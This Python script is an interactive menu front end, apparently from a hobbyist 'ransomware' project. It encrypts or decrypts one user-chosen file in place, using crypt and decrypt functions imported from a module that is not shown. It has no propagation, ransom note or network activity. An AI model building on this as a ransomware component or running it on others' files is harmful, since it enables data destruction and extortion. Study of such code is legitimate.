#!/usr/bin/env python
#  Copyright (c) 2020.
#  This code was designed and created by TH3R4VEN, its use is encouraged for academic and professional purposes.
#  I am not responsible for improper or illegal uses
#  Follow me on GitHub: https://github.com/th3r4ven

from termcolor import cprint, colored
import subprocess as command
from ransomware_menager import decrypt, crypt
import sys


def reset():
    command.run("clear")


def options():
    cprint("Select an option from the menu:", 'red')
    cprint(' 1) Crypt file', 'red')
    cprint(' 2) Decrypt File', 'red')
    cprint(' 3) Exit\n\n', 'red')
    return int(input(colored("option>", 'cyan')))


def main():

    try:
        reset()
        resp = options()

        if resp == 1:
            pwd = command.getoutput('pwd')
            cprint("Your current working directory: " + str(pwd), 'red')

            cprint("\nInsert the file path:\n", 'red')
            file = input(colored("File>", 'cyan'))

            with open(file, 'rb') as arq:
                content = arq.read()
            arq.close()
            content = crypt(content)

            with open(file, 'wt') as arq:
                arq.write(content)
            arq.close()

            cprint("\nYour file has been successfully encrypted.\n", 'red')
            cprint("\nPress any key to return to main menu\n")
            input(colored("Key>", 'cyan'))
            main()

        elif resp == 2:
            pwd = command.getoutput('pwd')
            cprint("Your current working directory: " + str(pwd), 'red')

            cprint("\nInsert the file path:\n", 'red')
            file = input(colored("File>", 'cyan'))

            cprint("\nInsert the encrypt key:\n", 'red')
            key = input(colored("Key>", 'cyan'))

            with open(file, 'rt') as arq:
                content = arq.read()
            arq.close()

            content = decrypt(content, key)

            with open(file, 'wb') as arq:
                arq.write(content)
            arq.close()

            cprint("\nYour file has been successfully decrypted.\n", 'red')
            cprint("\nPress any key to return to main menu\n")
            input(colored("Key>", 'cyan'))
            main()
        elif resp == 3:
            print("\n\n[-] Exiting....\n")
            exit()
        else:
            main()
    except KeyboardInterrupt:
        print("\n\n[-] Exiting....\n")
        exit()
    except ValueError:
        pass


main()



